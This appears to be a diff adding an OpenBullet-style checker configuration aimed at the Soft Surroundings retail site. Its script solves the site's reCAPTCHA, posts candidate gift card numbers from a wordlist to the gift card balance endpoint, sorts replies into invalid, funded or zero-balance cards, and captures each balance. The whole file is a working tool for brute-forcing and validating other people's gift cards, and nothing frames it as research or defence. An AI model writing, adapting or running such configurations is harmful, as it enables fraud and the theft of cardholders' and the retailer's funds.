@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Softsurroundings",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-08T16:13:56.3298292+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://www.softsurroundings.com/ajax/gcinqq.php" "6Lcn6SYUAAAAAO0khjA7woaBnhFthXNSd0cu7nQf" -> VAR "captcha" 
+REQUEST POST "https://www.softsurroundings.com/ajax/gcinqq.php" AutoRedirect=TRUE 
+  CONTENT "gca=1&gcno=<USER>&submitted=true&capt=<captcha>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.softsurroundings.com/?aid=gemini" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Gift Card" 
+  KEYCHAIN Success OR 
+    KEY "Amount remaining " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY " $0" 
+PARSE "<SOURCE>" LR "$" "<" Recursive=FALSE -> CAP "Balance" "$" "" 
